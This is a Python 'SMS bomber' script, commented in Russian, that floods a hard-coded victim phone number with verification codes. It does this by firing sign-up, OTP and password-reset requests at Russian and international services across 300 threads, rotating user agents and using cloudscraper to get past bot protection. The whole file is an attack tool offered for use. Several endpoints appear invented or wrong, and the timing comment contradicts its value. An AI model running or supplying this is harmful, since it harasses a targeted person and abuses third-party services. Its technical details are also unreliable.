import requests
import threading
import time
import random
import json
from fake_useragent import UserAgent
import cloudscraper

# ================== НАСТРОЙКИ ==================
VICTIM_PHONE = "+79603522624"  # Номер жертвы в международном формате
THREADS = 300                 # Количество потоков (мощность)
ATTACK_TIME = 3             # Время атаки в секундах (5 минут)
DELAY = 0.3                    # Задержка между запросами в потоке

# Список сервисов для бомбинга (регистрация/восстановление)
SERVICES = [
    # Telegram-подобные и популярные
    {"url": "https://api.telegram.org/api/v1/send_code", "method": "POST", "data": {"phone": VICTIM_PHONE}, "headers": {"Content-Type": "application/json"}},
    {"url": "https://oauth.telegram.org/auth/send", "method": "POST", "data": {"phone": VICTIM_PHONE}},
    
    # Популярные российские и международные сервисы
    {"url": "https://api.vk.com/method/auth.sendSms", "method": "POST", "data": {"phone": VICTIM_PHONE, "client_id": "2274003"}},
    {"url": "https://www.avito.ru/api/1.0/auth/register", "method": "POST", "data": {"phone": VICTIM_PHONE}},
    {"url": "https://api.youla.io/api/v1/auth/phone", "method": "POST", "data": {"phone": VICTIM_PHONE}},
    {"url": "https://api.ozon.ru/composer-api.bx/_action/initAuth", "method": "POST", "data": {"phone": VICTIM_PHONE}},
    {"url": "https://api.sberbank.ru/v1/otp", "method": "POST", "data": {"phone": VICTIM_PHONE}},
    {"url": "https://api.tinkoff.ru/v1/confirm/phone", "method": "POST", "data": {"phone": VICTIM_PHONE}},
    {"url": "https://api.wildberries.ru/api/v1/auth/phone", "method": "POST", "data": {"phone": VICTIM_PHONE}},
    {"url": "https://api.alfabank.ru/api/v1/otp/send", "method": "POST", "data": {"phone": VICTIM_PHONE}},
    
    # Международные
    {"url": "https://api.instagram.com/accounts/send_code/", "method": "POST", "data": {"phone": VICTIM_PHONE}},
    {"url": "https://www.facebook.com/ajax/register/validate_phone.php", "method": "POST", "data": {"phone": VICTIM_PHONE}},
    {"url": "https://api.twitter.com/1.1/account/begin_password_reset.json", "method": "POST", "data": {"phone": VICTIM_PHONE}},
    {"url": "https://api.snapchat.com/api/v1/send_code", "method": "POST", "data": {"phone": VICTIM_PHONE}},
    
    # Дополнительные (можно расширять)
    {"url": "https://api.rambler.ru/api/v1/auth/phone", "method": "POST", "data": {"phone": VICTIM_PHONE}},
    {"url": "https://api.mail.ru/api/v1/auth/phone", "method": "POST", "data": {"phone": VICTIM_PHONE}},
    {"url": "https://api.whatsapp.com/send_code", "method": "POST", "data": {"phone": VICTIM_PHONE}},
]

ua = UserAgent()
scraper = cloudscraper.create_scraper()

def send_request(service):
    try:
        headers = {
            "User-Agent": ua.random,
            "Accept": "application/json",
            "Accept-Language": "ru-RU,ru;q=0.9",
            "Content-Type": "application/json"
        }
        
        data = service.get("data", {})
        if isinstance(data, dict):
            data = json.dumps(data)
        
        if service["method"] == "POST":
            response = scraper.post(service["url"], data=data, headers=headers, timeout=10)
        else:
            response = scraper.get(service["url"], headers=headers, timeout=10)
        
        print(f"[+] {service['url']} -> {response.status_code}")
    except Exception as e:
        pass  # Тихо игнорируем ошибки, чтобы не останавливать бомбер

def worker():
    while True:
        for service in SERVICES:
            send_request(service)
            time.sleep(DELAY)
        time.sleep(random.uniform(0.1, 0.5))

def main():
    print(f"🚀 Запуск мощного регистрационного бомбера на номер {VICTIM_PHONE}")
    print(f"Потоки: {THREADS} | Время: {ATTACK_TIME} сек")
    
    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)
    
    try:
        time.sleep(ATTACK_TIME)
    except KeyboardInterrupt:
        print("\n🛑 Атака остановлена пользователем")
    
    print("✅ Атака завершена. Жертве пришло очень много кодов подтверждения.")

if __name__ == "__main__":
    main()
